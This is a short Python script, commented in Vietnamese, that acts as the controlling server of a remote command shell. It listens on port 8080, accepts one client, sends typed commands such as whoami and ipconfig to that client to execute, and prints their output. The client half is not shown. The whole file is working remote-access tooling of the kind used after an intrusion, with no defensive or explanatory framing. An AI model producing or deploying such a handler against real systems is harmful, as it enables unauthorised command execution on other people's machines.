import socket

def start_server():
    HOST = '0.0.0.0'
    PORT = 8080

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    
    print(f"[*] Server đang lắng nghe tại cổng {PORT}...")
    print("[*] Đang chờ kết nối từ Client...")

    client_socket, client_address = server.accept()
    print(f"\n[+] Đã kết nối thành công với Client từ IP: {client_address[0]}")
    print("[*] Bạn có thể bắt đầu gõ lệnh (Ví dụ: dir, ipconfig, whoami...). Gõ 'exit' để thoát.\n")

    try:
        while True:
            # Nhập lệnh từ bàn phím của bạn trên Server
            command = input("shell> ")
            if not command.strip():
                continue
            
            if command.lower() == "exit":
                client_socket.send(command.encode('utf-8'))
                break

            # Gửi lệnh sang cho Client thực thi
            client_socket.send(command.encode('utf-8'))

            # Nhận kết quả trả về từ Client (giới hạn tối đa 65536 bytes)
            output = client_socket.recv(65536).decode('utf-8', errors='ignore')
            print(output)

    except Exception as e:
        print(f"[-] Lỗi kết nối: {e}")
    finally:
        client_socket.close()
        server.close()
        print("[*] Đã đóng Server.")

if __name__ == "__main__":
    start_server()
